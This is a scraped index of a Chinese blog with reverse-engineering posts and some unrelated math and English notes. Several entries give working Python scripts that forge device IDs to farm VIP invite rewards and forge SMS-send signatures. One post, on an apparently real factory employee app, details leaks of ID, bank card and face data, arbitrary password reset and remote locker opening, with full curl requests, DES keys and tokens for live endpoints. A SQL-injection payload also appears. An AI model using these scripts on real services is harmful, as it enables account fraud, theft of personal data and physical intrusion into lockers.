header[\u0026#39;X-JSL-API-AUTH\u0026#39;]=x_t(\u0026#39;/app/api/user/info\u0026#39;) # 你的X-TOKEN # header[\u0026#39;X-TOKEN\u0026#39;]=\u0026#39;4LJnAngoza8TZIz2otKTe52PhqbrW8GULUYVUu87AjDKzXQWPzNCDiHTohcbTWRcJ5V+mdgxrLVskUbLae90njTJJk4bG8tqYcgDX/fhwwG0VkkB11CY0wLhlxPfSkfMSlqmArvVTbrJ7UiydzotGh9nUHVrBqxMbDy9+iuhq9pFmucuV1SRKd/1pGxDNI0UX9nA5mpYMfYih0N/vR3A6+AdHQASRqBpeXSfMj3M7fHY/5W4fj0esNHkw93KjsnWM2FJWdNCYrkZC3tHWipUqKTk7zvbx20zaWo/c78VuePh8OeiCV2Htt9ah8+MNvAu+o6TERNF13aavGJkxeptaZs/+PFbBa397NVD4zQ28QDhkuOthPwHbpvOL/cWm9rjoL7TH7BdKGqjbYzHTvUnpWHQtJhGTPXRdNdSklDv4UDW/nsKTVVcv1LQAU1Oo5EnMwfZF2wmTtIRMRTPIi9zYFVhTYlJeFroe2fWrl8H9afzxz+fP+tm5aGSa7Ll0RBitPmN364On3xaWrRIiYGvfYsqckb6+BRQyDMXI+nHUMOAR2EcT6U3BMUCN5VJnkX8atWL76jdqPlFZzS9zyo5yaeiNLnQzVYm9wxNPuzb9ZMgvRQ4TnXfBGE5t8BiE4jAPJczvQhvWseHNy3M3wCd5b7CavKAVznoovCoLaqJpRX+bOWnttUWMLqdYxBnweL3\u0026#39; # result=requests.post(url+\u0026#39;/app/api/user/info\u0026#39;,data=\u0026#39;{\u0026#34;handshake\u0026#34;:\u0026#34;v20200429\u0026#34;}\u0026#39;,headers=header).json() # print(json.loads(decrypt(result[\u0026#39;data\u0026#39;],key))[\u0026#39;vip_expired\u0026#39;]) # 邀请码 for i in range(5): parent(\u0026#39;RWK6IF\u0026#39;) mls\napi/user/traveler JhbGciOiJIUzI1Ni {\u0026#34;p\u0026#34;:\u0026#34;9EYS4F\u0026#34;} 逆向过程\n"},{"id":69,"href":"/docs/re/new/bika/","title":"某h软件 bika","section":"demo","content":"bika 动漫,dddd\nflutter 以前用过，但是没有arm64的so，所有就放弃了，今天一个朋发给我，发现居然后arm64的，那就别挂我不客气。\nblutter 启动，dart 2.19 解析出来了\n主要是事看pp.txt和 addNames.py 这两个文件，找关键字，看有地址的，一般这种软件加密都是aes，所以直接搜索，安后挨个挨个frida hook，\nblutter 会生成一个blutter_frida.js, 添加一句话\nconst fn_addr = 0x7e1018; Interceptor.attach(libapp.add(fn_addr), { onEnter: function () { init(this.context); let objPtr = getArg(this.context, 0); const [tptr, cls, values] = getTaggedObjectValue(objPtr); console.log(`${cls.name}@${tptr.toString().slice(2)} =`, JSON.stringify(values, null, 2)); //就是添这句话,找关键字就行了, console.log(\u0026#39;hexdump ==\u0026gt; \u0026#39;+hexdump(objPtr)); } }); 多hook 几次基本拿下，然后就是猜，deviceId忙猜随机生成，拿uuid做md5去前16位，直接传上去，发现可以，最后就是喜闻乐见得绑定邀请码获得VIP，直接就是稳稳得拿下。\nimport requests, time, json, uuid ,hashlib from Crypto.Cipher import AES from Crypto.Util.Padding import pad code=\u0026#39;YMMTK\u0026#39; cipher = AES.new(b\u0026#39;525202f9149e061d\u0026#39;, AES.MODE_ECB) def get_header(): return { \u0026#39;user-agent\u0026#39;: \u0026#39;Mozilla/5.0 (Linux; U; Android 2.1; en-us; Nexus One Build/ERD62) AppleDart/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17\u0026#39;, \u0026#39;version\u0026#39;: \u0026#39;1.0\u0026#39;, \u0026#39;devicetype\u0026#39;: \u0026#39;android\u0026#39;, \u0026#39;time\u0026#39;: str(int(time.time()*1000)), \u0026#39;host\u0026#39;: \u0026#39;api.bkrezwvjkc.com\u0026#39;, \u0026#39;content-type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39;, } def remove_pkcs7_padding(data: bytes, block_size: int = 16): if len(data) % block_size != 0: raise ValueError(\u0026#34;Data length is not a multiple of the block size\u0026#34;) padding_length = data[-1] if padding_length \u0026gt; block_size or padding_length \u0026lt;= 0: raise ValueError(\u0026#34;Invalid padding detected\u0026#34;) padding = data[-padding_length:] if any(byte != padding_length for byte in padding): raise ValueError(\u0026#34;Inconsistent padding detected\u0026#34;) return data[:-padding_length] def en(map): plaintext_bytes_padded = pad(json.dumps(map).encode(), AES.block_size) return cipher.encrypt(plaintext_bytes_padded).hex() def de(s): a=cipher.decrypt(s) a=remove_pkcs7_padding(a) return json.loads(a.decode().replace(\u0026#39;\\r\u0026#39;,\u0026#39;\u0026#39;).replace(\u0026#39;\\\\\\\\\u0026#39;,\u0026#39;\\\\\u0026#39;)) def device_id(): random_uuid = uuid.uuid4() uuid_str = str(random_uuid) return hashlib.md5(uuid_str.encode()).hexdigest()[:16] def get_token(): dviceId=device_id() map={\u0026#34;token\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;deviceId\u0026#34;:dviceId,\u0026#34;data\u0026#34;:{\u0026#34;app_code\u0026#34;:\u0026#34;ch2\u0026#34;,\u0026#34;clipboard_text\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;channel_code\u0026#34;:\u0026#34;channel://zwkab1bk\u0026#34;}} result=requests.post(\u0026#39;http://api.bkrezwvjkc.com/cxapi/system/info\u0026#39;,headers=get_header(),data=en(map)) json_str=de(result.content) print(json_str) return json_str[\u0026#39;data\u0026#39;][\u0026#39;token\u0026#39;][\u0026#39;token\u0026#39;], json_str[\u0026#39;data\u0026#39;][\u0026#39;token\u0026#39;][\u0026#39;user_id\u0026#39;], dviceId def bind(): token, uid, device_id=get_token() map={\u0026#39;token\u0026#39;:token+\u0026#39;_\u0026#39;+uid,\u0026#39;deviceId\u0026#39;:device_id,\u0026#39;data\u0026#39;:{\u0026#39;code\u0026#39;:code}} response = requests.post(\u0026#39;http://api.bkrezwvjkc.com/cxapi/user/bindParent\u0026#39;, headers=get_header(), data=en(map)) json_str=de(response.content) print(json_str) bind() "},{"id":70,"href":"/docs/re/new/%E6%9F%90h%E8%BD%AF%E4%BB%B6-2/","title":"某h软件-2","section":"demo","content":"所需工具\n逍遥模拟器 lamda jadx frida 一双手 抓包\r#\r软件有root检测和代理检测，这里不讲绕过。代理不要挂。 安装lamda：\nset HTTPS_PROXY=127.0.0.1:7890 git clone https://github.com/rev1si0n/lamda.git rev1si0n/lamda: ⚡️ Android reverse engineering \u0026amp; automation framework | 史上最强安卓抓包/逆向/HOOK \u0026amp; 云手机/远程桌面/自动化辅助框架，你的工作从未如此简单快捷。\n下载lamda-server-x86_64.tar.gz 以及busybox-x86_64\n先把模拟器的root打开\n# 在你下载好的目录打开终端 adb push lamda-server-x86_64.tar.gz /data/local/tmp adb push busybox-x86_64 /data/local/tmp adb shell # 以下命令都是在adb shell中执行的 su chmod 755 /data/local/tmp/busybox-x86_64 cd /data /data/local/tmp/busybox-x86_64 tar -xzf /data/local/tmp/lamda-server-x86_64.tar.gz rm /data/local/tmp/lamda-server-x864.tar.gz rm /data/local/tmp/busybox-x86_64 启动lamda\n继续上一步结尾\ncd /data/local/tmp/server/bin sh launch.sh 启动完成 ctrl+D退出终端\n在你的lamda目录里打开终端\ncd tools python startmitm.py localhost 启动app，记得关掉root再启动，已经可以抓包了\n逆向\r#\r看看抓包\n一眼盯帧，是有加密，那么，开始逆向吧 工具jadx，把apk拖进去\nX-JSL-API-AUTH\r#\r搜索大法好啊，ctrl+shift+F，直接找关键字 X-JSL-API-AUTH\n只有一处\n有，直接跟进去，v.a.a\nString a = v.a.a(Z.h().u().getPath()); 看到MD5关键字\n参数基本一目了然\n唯一有一个key参数，来自so层，右键这个函数，生成frida hook代码， frida hook不在此展开，多次hook易得key横不变，为 l8N2iooyp07M9IWa\n易得脚本\nX-TOKEN\r#\r搜索，只有一个，按x，交叉引用，诶，找不到 但是，我们继续在上面能找到 f.a(com.niming.weipa.b.a.A, com.niming.weipa.utils.b.b(String.valueOf(jSONObject))); 一句\ncom.niming.weipa.b.a.A就是 X-TOKEN，后面是在加密那坨hashmap 看看加密，AES/ECB/PKCS7Padding，key还是同一个l8N2iooyp07M9IWa DATA\r#\r直接去搜索data的话，肯定会有很多结果，注意到json中有一个handshake参数，大概是恒固定的，去搜索一下v20200429\n只有一个结果，直接定位到加密\n发现是使用的是和上面相同的加密方法 hook一下这个加密方法，看看都加密是些什么东西\n右键这个方法，复制frida 方法，这里不再展开\n邀请好友\r#\rfrom hashlib import md5 import time import requests from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad import base64,json import random MODE = AES.MODE_ECB PAD_STYLE = \u0026#39;pkcs7\u0026#39; ENCODING = \u0026#39;UTF-8\u0026#39; key=\u0026#39;l8N2iooyp07M9IWa\u0026#39; url=\u0026#39;http://apichlove.com\u0026#39; def encrypt(plaintext: str, key: str) -\u0026gt; str: key_bytes = key.encode(ENCODING) cipher = AES.new(key_bytes, MODE) plaintext_bytes = plaintext.encode(ENCODING) plaintext_bytes_padded = pad(plaintext_bytes, AES.block_size, PAD_STYLE) ciphertext_bytes = cipher.encrypt(plaintext_bytes_padded) ciphertext_base64_bytes = base64.b64encode(ciphertext_bytes) ciphertext = ciphertext_base64_bytes.decode(ENCODING) return ciphertext def decrypt(ciphertext: str, key: str) -\u0026gt; str: key_bytes = key.encode(ENCODING) decrypter = AES.new(key_bytes, MODE) ciphertext_base64_bytes = ciphertext.encode(ENCODING) ciphertext_bytes = base64.b64decode(ciphertext_base64_bytes) plaintext_bytes_padded = decrypter.decrypt(ciphertext_bytes) plaintext_bytes = unpad(plaintext_bytes_padded, AES.block_size, PAD_STYLE) plaintext = plaintext_bytes.decode(ENCODING) return plaintext def x_t(url): a = [] b = [] # url = \u0026#39;app/api/auth/login/device\u0026#39; v1 = str(int(time.time())) v2 = md5(v1.encode()).hexdigest()[:8] a.append(\u0026#39;md5\u0026#39;) a.append(key) a.append(v1) a.append(v2) a.append(url) v3 = \u0026#39;|\u0026#39;.join(a) v3 = md5(v3.encode()).hexdigest() b.append(\u0026#39;md5\u0026#39;) b.append(v1) b.append(v2) b.append(v3) return \u0026#39;|\u0026#39;.join(b) def getRandom(randomlength=16): digits=\u0026#39;0123456789\u0026#39; ascii_letters=\u0026#39;abcdefghigklmnopqrstuvwxyz\u0026#39; str_list =[random.choice(digits +ascii_letters) for i in range(randomlength)] random_str =\u0026#39;\u0026#39;.join(str_list) return random_str def Token(): device_id=\u0026#39;b2ad30fc-0301-3d50-a97f-\u0026#39;+getRandom(12) data = json.dumps({\u0026#34;channel\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;device_no\u0026#34;: device_id,\u0026#34;device_type\u0026#34;: \u0026#34;A\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;}) data={\u0026#39;data\u0026#39;:encrypt(data,key),\u0026#39;handshake\u0026#39;:\u0026#39;v20200429\u0026#39;} header = {\u0026#39;X-JSL-API-AUTH\u0026#39;: x_t(\u0026#39;/app/api/auth/login/device\u0026#39;)} result = requests.post(url+\u0026#39;/app/api/auth/login/device\u0026#39;, json=data, headers=header).json() msg=decrypt(result[\u0026#39;data\u0026#39;],key) # print(msg) return json.loads(msg)[\u0026#39;auth\u0026#39;][\u0026#39;token\u0026#39;],device_id def x_token(device_id,token): Json=json.dumps({\u0026#34;device_no\u0026#34;:device_id,\u0026#34;device_type\u0026#34;:\u0026#34;A\u0026#34;,\u0026#34;token\u0026#34;:token,\u0026#34;version\u0026#34;:\u0026#34;1.0.0\u0026#34;}) return encrypt(Json,key) def parent(code): token,device_id=Token() data={\u0026#39;data\u0026#39;:encrypt(json.dumps({\u0026#39;code\u0026#39;:code}),key),\u0026#39;handshake\u0026#39;:\u0026#39;v20200429\u0026#39;} header={\u0026#39;X-JSL-API-AUTH\u0026#39;:x_t(\u0026#39;/app/api/user/bindcode\u0026#39;),\u0026#39;X-TOKEN\u0026#39;:x_token(device_id=device_id,token=token)} result=requests.post(url+\u0026#39;/app/api/user/bindcode\u0026#39;,json=data,headers=header).json() print(result) print(decrypt(result[\u0026#39;data\u0026#39;],key)) header[\u0026#39;X-JSL-API-AUTH\u0026#39;]=x_t(\u0026#39;/app/api/user/info\u0026#39;) # 你的X-TOKEN # header[\u0026#39;X-TOKEN\u0026#39;]=\u0026#39;4LJnAngoza8TZIz2otKTe52PhqbrW8GULUYVUu87AjDKzXQWPzNCDiHTohcbTWRcJ5V+mdgxrLVskUbLae90njTJJk4bG8tqYcgDX/fhwwG0VkkB11CY0wLhlxPfSkfMSlqmArvVTbrJ7UiydzotGh9nUHVrBqxMbDy9+iuhq9pFmucuV1SRKd/1pGxDNI0UX9nA5mpYMfYih0N/vR3A6+AdHQASRqBpeXSfMj3M7fHY/5W4fj0esNHkw93KjsnWM2FJWdNCYrkZC3tHWipUqKTk7zvbx20zaWo/c78VuePh8OeiCV2Htt9ah8+MNvAu+o6TERNF13aavGJkxeptaZs/+PFbBa397NVD4zQ28QDhkuOthPwHbpvOL/cWm9rjoL7TH7BdKGqjbYzHTvUnpWHQtJhGTPXRdNdSklDv4UDW/nsKTVVcv1LQAU1Oo5EnMwfZF2wmTtIRMRTPIi9zYFVhTYlJeFroe2fWrl8H9afzxz+fP+tm5aGSa7Ll0RBitPmN364On3xaWrRIiYGvfYsqckb6+BRQyDMXI+nHUMOAR2EcT6U3BMUCN5VJnkX8atWL76jdqPlFZzS9zyo5yaeiNLnQzVYm9wxNPuzb9ZMgvRQ4TnXfBGE5t8BiE4jAPJczvQhvWseHNy3M3wCd5b7CavKAVznoovCoLaqJpRX+bOWnttUWMLqdYxBnweL3\u0026#39; # result=requests.post(url+\u0026#39;/app/api/user/info\u0026#39;,data=\u0026#39;{\u0026#34;handshake\u0026#34;:\u0026#34;v20200429\u0026#34;}\u0026#39;,headers=header).json() # print(json.loads(decrypt(result[\u0026#39;data\u0026#39;],key))[\u0026#39;vip_expired\u0026#39;]) # 邀请码 for i in range(5): parent(\u0026#39;RWK6IF\u0026#39;) "},{"id":71,"href":"/docs/learm/math/%E6%B3%B0%E5%8B%92%E5%85%AC%E5%BC%8F/","title":"泰勒公式","section":"math","content":"常见泰勒公式，展就完了\n$$ \\begin{aligned} e^x=1+x+\\frac{1}{2!}x^2+\\frac{1}{3!}x^3+o(x^3) \\ \\\\ \\ln(1+x)=x-\\frac{1}{2}x^2+\\frac{1}{3}x^3+o(x^3) \\\\ \\sin{x}=x-\\frac{x^3}{3!}+o(x^3) \\\\ \\cos{x}=1-\\frac{x^2}{2!}+\\frac{x^4}{4!}+o(x^4) \\ \\arcsin{x}=x+\\frac{x^3}{3!}+o(x^3) \\ \\tan{x}=x-\\frac{x^3}{3}+o(x^3) \\ \\arctan=x-\\frac{x^3}{3}+o(x^3) \\ (1+x)^n=1+nx+\\frac{n(n-1)}{2}x^2+o(x^2) \\end{aligned}\n$$\n"},{"id":72,"href":"/docs/re/new/%E6%B7%98%E9%87%91%E7%A4%BE%E5%8C%BA%E7%99%BB%E9%99%86/","title":"淘金社区登陆","section":"demo","content":"某个淘金社区，登陆有md5加密\n用blutter 解析一下，找到hash_update的地址，放到frida的脚本中，在console的下面加一句\nconsole.log(\u0026#39;hexdump\u0026#39;+hexdump(args[0])) 打印出来4个uint32List，虽然看不懂，但是我们打印了hex\n多看几次知道有随机的东西，在多看几次就知道应该是时间戳末尾在控制，反复测试得到所有出现过的字符，易得脚本\nimport requests import hashlib import time def get_data(p): A=[\u0026#39;gcw7eeh5\u0026#39;,\u0026#39;eegc15nnccccoqh5r7\u0026#39;,\u0026#39;15gcnncc\u0026#39;,\u0026#39;h5ccccgc15nnee/i\u0026#39;,\u0026#39;15gcnnq4oq/ih5oqccccee\u0026#39;,\u0026#39;15cc/ir7oqnnq4oqh5\u0026#39;,\u0026#39;nncc/i\u0026#39;,\u0026#39;h515r7q4oqcc\u0026#39;,\u0026#39;oqoqnnr7q4/i\u0026#39;,\u0026#39;h5nn\u0026#39;] B=[\u0026#39;eeoqh5\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;h5ccoqeer7\u0026#39;,\u0026#39;oqr7\u0026#39;,\u0026#39;r7\u0026#39;,\u0026#39;oqccgc\u0026#39;,\u0026#39;oqccgcoqh515r7oqq4\u0026#39;,\u0026#39;oqgcoqnn/i\u0026#39;,\u0026#39;h515oqcc\u0026#39;,\u0026#39;oq\u0026#39;] C=[\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;/iq4\u0026#39;,\u0026#39;q4\u0026#39;,\u0026#39;op\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;gc\u0026#39;,\u0026#39;2115oqr7q4/ioqccgc\u0026#39;] # 16位时间戳 t=str(int(time.time()*1000000)) k=int(t[-1]) # B164D0C43EDB3BAD89D1A073EBE9691D # 为固定值，可能跟随app版本所迭代 #一下情况特殊出现，需要对换位置 if k==8 or k==5: message= \u0026#39;action=sendcode\u0026amp;phone={}\u0026amp;verifytoken={}\u0026amp;verifycodes={}{}B164D0C43EDB3BAD89D1A073EBE9691D..{}W1W2W3W4W5W6W7W8W901020304050607..{}{}\u0026#39;.format(p,\u0026#39;{system::verifytoken}\u0026#39;,\u0026#39;{system::verifytoken}\u0026#39;,A[k],B[k],C[k],t) else: message= \u0026#39;action=sendcode\u0026amp;phone={}\u0026amp;verifytoken={}\u0026amp;verifycodes={}{}W1W2W3W4W5W6W7W8W901020304050607..{}B164D0C43EDB3BAD89D1A073EBE9691D..{}{}\u0026#39;.format(p,\u0026#39;{system::verifytoken}\u0026#39;,\u0026#39;{system::verifytoken}\u0026#39;,A[k],B[k],C[k],t) # print(message) return {\u0026#39;action\u0026#39;:\u0026#39;sendcode\u0026#39;,\u0026#39;phone\u0026#39;:p,\u0026#39;verifytoken\u0026#39;:hashlib.md5(message.encode()).hexdigest(),\u0026#39;verifycodes\u0026#39;:t} data=get_data(\u0026#39;19999994444\u0026#39;) resp=requests.get(\u0026#39;http://bbs.taojingdaohang.cn/index.php\u0026#39;,params=data) print(resp.text) 测试正常发送短信\n"},{"id":73,"href":"/docs/re/new/%E7%88%B1%E5%A4%9A%E5%A4%9A-%E5%88%86%E6%9E%90/","title":"爱多多 分析","section":"demo","content":"\r前言\r#\r放假了，得去挣点学费，遂进厂，厂里的app，越权漏洞和信息泄露，以及基础的逆向分析\n注：以下内容仅供学习和参考，请勿用于违法行为活动\n登陆\r#\r应该是加密了，并且有key，app有壳，xx御安全，我用的frida-dexdump -FU脱几个dex出来\n用jadx打开不错，改用GDA，网上有免费版\n这里一个一个dex的搜，出现在classes02.dex中\n其中key是由你的工号，用异变凯撒变换，工号和密码在so中完成加密\n可以先hook看一下传进去的值，在GDA这个工具中可以直接右键函数可以直接hook，还是比较方便的（提前在adb中启动frida）这里打一下码，见谅\n所里面非常简单，没有混淆之类，但是把传进去的key又做了一次异变凯撒变换，再进行des cbc加密\n看到一个字符串，不免想到是iv，（函数名就是DESencypt）\n不过后来我试图重写时发现，加密内容非8整倍用0字节填充，结果不一样（但不影响下文）\n用py复写整个登陆，可以上号，我发现返回包中尽然没有任何维持身份的东西（就很奇怪，登陆就是个摆设？）\n信息泄露\r#\r身份信息泄露\n在访问我的资料，发现从服务器上请求中参数值需要工号（注意，以下信息量爆炸，统统码住）\n注：据我像老员工打听，工号就是按照顺序来的，工号起初设计应是考虑了1000w的人（已离职工号是已使用，不会在重启工号给别人使用，该洞即可遍历所有工号，但是是一个工程量巨大的事情）\n薪资卡信息\n访问薪资卡，会要求我们输入登陆密码，还有一个摆设本地验证码，获取信息，请求如下\n同样工号加密了，搜索易得java 层DES加密，key is fga2dfe@\n拿到key，对返回结果一统解密，泄露银行卡卡号（个人），开户行，姓名，这里就不放图片了，很暴力\n人脸图像\n进入厂区有些时候需要刷脸，也可刷厂牌，用户可以自己在app中采集人脸，（进厂前已收集一张）\n先获取图片路径和图片绑定的uuid（码住）\n随后向接口getImageByUrl获取图片，我试图尝试任意文件读取漏洞，但是似乎失败了，fuzz读取/etc/passwd和/etc/shadow返回空，其他404\n人脸图片在app中不是每个用户都有（有的自己删除了），影响：都有了你的sfz_id和name、phone，再加个人脸图附魔不过分吧，别人可能干一些非法认证，绑定一些人脸业务\n越权\r#\r额，我也不知道这算不算越权\n回到头来分析，好像楼掉了些甚么，看了看验证码，修改忘记密码之类\n其中忘记密码是在登陆界面，会先输入你的工号，会想服务器获取工号绑定的手机号，app上是对手机号的中间4位打了\u0026quot;*\u0026ldquo;号，我一看包，卧槽，这么暴力吗，响应包中就是完整的手机号（又是一个任意信息泄露），\n你以为就这，之后向服务器请求发送验证码，发送过来的验证码我发现竟然在请求包中（即验证码在本地随机产生一个6位数）\n我马上即想到任意用户密码修改，因为验证码由我们所控制，后来我发现根本没必要\n接下来重置密码（只需要填写新密码），发现新大陆（超级暴力）\n请求包中的内容pwd和EmpNo（工号）是上文提到的so中的加密方式，key也同理的\n那么就出现了，任意用户密码重置，实测我朋友已成功\n更加暴力的\r#\r众所周知，厂里是有储物柜的，有电子锁和自带钥匙的那种\n这个厂有部分员工是在使用电子锁，开锁方式（厂牌和手机上的这个app远程开锁）\n结合上面我们已经有了任意用户密码重置的漏洞，网络黑客直接侵入现实\n获取储物柜位置\n像服务器发包，只需工号，返回储物柜位置，没有则null\n开柜\n原来没有那么复杂，开柜需要输入密码，密码是本地校验（逆天？）,后像服务器发送开柜指令（只需工号），原来是我多想了\n后记\r#\r这个app现在对我而言基本没什么安全所言了，而这些信息都是在进厂前就被收集了的，但是厂商对待你们的信息那完全就不当回事\n如果有看官看出来了是哪个厂，也请莫要声张，厂商大概是不会去修复这些漏洞的，以免造成大规模的信息泄露及物理安全\n有出现错别字见谅，因为要睡觉了\n以上内容仅供学习和参考，请勿用于违法行为\n2024 8 13 晚\r#\r分析爱多多，发现稍有变化，但不大。数据仍然可取，稍有提高安全意识\n现简要记录一下\njava DES CBC Pkcs5\r#\r固定key1 fga2dfe@，iv相同\n变化key2 异变凯撒编码，初始offset 10 得到key，iv相同\nAPI\r#\rbase info\r#\rcurl --request POST \\ --url https://b2e.aservice.foxconn.com/APPService/UserInfoService.asmx/GetEmpBaseInfoV002 \\ --header \u0026#39;Accept-Encoding: gzip\u0026#39; \\ --header \u0026#39;Connection: Keep-Alive\u0026#39; \\ --header \u0026#39;Content-Type: application/x-www-form-urlencoded; charset=UTF-8\u0026#39; \\ --header \u0026#39;User-Agent: Dalvik/2.1.0 (Linux; U; Android 14; 23013RK75C Build/UKQ1.230804.001)\u0026#39; \\ --header \u0026#39;charset: utf-8\u0026#39; \\ --data \u0026#39;strKey=MBE?AG@F\u0026#39; \\ --data strModuleName=f74cf1512eada1cdd16a42b2e7bca585 \\ --data strFactory=7300 \\ --data strEmpNo=AkaoqKxxHLI0aDwTOFI9Ag== 部分参数解释：\nstrKey 上文key2 strModuleName EMPINFO md5 strFactory 随意4位数，已验证，不校验 strEmpNo 上文des使用key2加密\n得到部分隐私信息，cardid 被打码了，通过下面两个api可得\nstrkey 固定 工号\ncurl --request POST \\ --url https://b2e.aservice.foxconn.com/APPService/EpidemicProtocolService.asmx/GetEmpBaseInfo \\ --header \u0026#39;Accept-Encoding: gzip\u0026#39; \\ --header \u0026#39;Connection: Keep-Alive\u0026#39; \\ --header \u0026#39;Content-Type: application/x-www-form-urlencoded; charset=UTF-8\u0026#39; \\ --header \u0026#39;User-Agent: Dalvik/2.1.0 (Linux; U; Android 14; 23013RK75C Build/UKQ1.230804.001)\u0026#39; \\ --header \u0026#39;charset: utf-8\u0026#39; \\ --data strKey=qEUNqLLMOwcDuFwwPngLfZiet6zhdWGzLUPPaJIptvM= \\ --data strEmpNo=C7949572 strFac 上文随机4位数，只不过加密，des，key1 strProjectName name des key1（name 来自与上下文得到，已知一个SMT-NPI-DC/DV/DJ,可以用来测试） strEmpNo 工号 des key1\ncurl --request POST \\ --url https://b2e.aservice.foxconn.com/APPService/NewNDAService.asmx/GetEmpBaseInfoNew \\ --header \u0026#39;Accept-Encoding: gzip\u0026#39; \\ --header \u0026#39;Connection: Keep-Alive\u0026#39; \\ --header \u0026#39;Content-Type: application/x-www-form-urlencoded; charset=UTF-8\u0026#39; \\ --header \u0026#39;User-Agent: Dalvik/2.1.0 (Linux; U; Android 14; 23013RK75C Build/UKQ1.230804.001)\u0026#39; \\ --header \u0026#39;charset: utf-8\u0026#39; \\ --data \u0026#39;strFac=+GfFCIBe9qs= \u0026#39; \\ --data strProjectName=jtJI/32rr2YKxl4Je6jCyDWT0vKA9gF/ \\ --data \u0026#39;strEmpNo=Rdk1m+3s59mSnkSUUlS+zQ==\u0026#39; nda 协议 列表\r#\rdes key1\n得到的同样des key1 解开，去掉前面的序号啥的，再加密回去，用作上文GetEmpBaseInfoNew 的参数\ncurl --request POST \\ --url https://b2e.aservice.foxconn.com/APPService/NewNDAService.asmx/GetEmpProjectStatusNew \\ --header \u0026#39;Accept-Encoding: gzip\u0026#39; \\ --header \u0026#39;Connection: Keep-Alive\u0026#39; \\ --header \u0026#39;Content-Type: application/x-www-form-urlencoded; charset=UTF-8\u0026#39; \\ --header \u0026#39;User-Agent: Dalvik/2.1.0 (Linux; U; Android 14; 23013RK75C Build/UKQ1.230804.001)\u0026#39; \\ --header \u0026#39;charset: utf-8\u0026#39; \\ --data \u0026#39;factory=+GfFCIBe9qs= \u0026#39; \\ --data \u0026#39;strEmpNo=Rdk1m+3s59mSnkSUUlS+zQ== \u0026#39; 柜子\r#\r开柜子， emp_no用 key1 token 固定\ncurl --request POST \\ --url https://b2e.aservice.foxconn.com/APPService/CDLockerService.asmx/OpenLoker \\ --header \u0026#39;Accept-Encoding: gzip\u0026#39; \\ --header \u0026#39;Connection: Keep-Alive\u0026#39; \\ --header \u0026#39;Content-Type: application/x-www-form-urlencoded; charset=UTF-8\u0026#39; \\ --header \u0026#39;User-Agent: Dalvik/2.1.0 (Linux; U; Android 14; 23013RK75C Build/UKQ1.230804.001)\u0026#39; \\ --header \u0026#39;charset: utf-8\u0026#39; \\ --data emp_no=aEjJuoP3GWoorfnsI6Z47A== \\ --data \u0026#39;accessToken=vNeYI2_w#tWQotRwQ\u0026#39; 开柜子 api1\n参数要的比较多\nemp_no key2 accessToken 固定 auhToken 需要密码，通过另一个api给的，本地持久化，可以说是增强的一点了。并且看不出来是什么加密或者编码的token\ncurl --request POST \\ --url https://b2e.aservice.foxconn.com/APPService/CDLockerService.asmx/OpenLokerV001 \\ --header \u0026#39;Accept-Encoding: gzip\u0026#39; \\ --header \u0026#39;Connection: Keep-Alive\u0026#39; \\ --header \u0026#39;Content-Type: application/x-www-form-urlencoded; charset=UTF-8\u0026#39; \\ --header \u0026#39;User-Agent: Dalvik/2.1.0 (Linux; U; Android 14; 23013RK75C Build/UKQ1.230804.001)\u0026#39; \\ --header \u0026#39;charset: utf-8\u0026#39; \\ --data strAuth=MBEAGDFH \\ --data \u0026#39;emp_no=26Sc7u31sW2Qkyz4rCrNCg== \u0026#39; \\ --data \u0026#39;accessToken=vNeYI2_w#tWQotRwQ\u0026#39; \\ --data authToken=Vzxurzz281Rb8rNkmrtYpvVsMI8/fROS2pAaZSPUVsL9Bejde9Q3mg==21936136 获取柜子信息 参数上文同理\ncurl --request POST \\ --url https://b2e.aservice.foxconn.com/APPService/CDLockerService.asmx/GetEmpLokerData \\ --header \u0026#39;Accept-Encoding: gzip\u0026#39; \\ --header \u0026#39;Connection: Keep-Alive\u0026#39; \\ --header \u0026#39;Content-Type: application/x-www-form-urlencoded; charset=UTF-8\u0026#39; \\ --header \u0026#39;User-Agent: Dalvik/2.1.0 (Linux; U; Android 14; 23013RK75C Build/UKQ1.230804.001)\u0026#39; \\ --header \u0026#39;charset: utf-8\u0026#39; \\ --data \u0026#39;emp_no=Rdk1m+3s59mSnkSUUlS+zQ== \u0026#39; \\ --data \u0026#39;accessToken=vNeYI2_w#tWQotRwQ\u0026#39; "},{"id":74,"href":"/docs/learm/english/%E7%8E%B0%E5%9C%A8%E8%BF%9B%E8%A1%8C%E6%97%B6/","title":"现在进行时","section":"english","content":"一、现在进行时表示正在进行的动作或存在的状态，常常与now,look,listen,at present等时间状语连用。\n二、现在进行时的构成：be(am/is /are)+现在分词\n三、现在进行时态的肯定式、否定式、疑问式及回答。\n肯定式\r#\rbe(am/is/are)+动词-ing\n如：I am watching TV.\nShe is reading a book.\nThey are running.\n否定式\r#\rbe+not+动词-ing形式\n如：The twins aren\u0026rsquo;t cleaning their bedroom.\n一般疑问句\r#\rbe 动词提前。\n肯定回答：Yes,主语+be.\n否定回答：No,主语+be not.\n如：Are you playing the pipa now?\nYes,I am. ,I am not.\n特殊疑问句：\r#\r（1）对谓语动词进行提问：What +be +主语+doing+其他？\n如：What is the boy doing under the tree?\n那个男孩在树下做什么？\n（2）对其他成分进行提问：疑问词+一般疑问句？\n如：Where is the man swimming?\n那个人在哪里游泳？\n动词ing规则\n"},{"id":75,"href":"/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E7%9B%B2%E6%B3%A8/","title":"盲注","section":"php","content":"盲注就是回显只有对或者错的情况（如0，1）\n1\u0026#39; or \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39; group by passwd with rollup having passwd is NULL — – 测试极客大挑战finalsql\nimport requests import time g=0 host = \u0026#34;http://e7adeb0b-7190-4ea3-bd06-49e63e17e775.node4.buuoj.cn:81/backend/content_detail.php\u0026#34; parse={\u0026#39;id\u0026#39;:\u0026#39;\u0026#39;} def getDatabase(): #获取数据库名 global host ans=\u0026#39;\u0026#39; for i in range(1,1000): low = 32 high 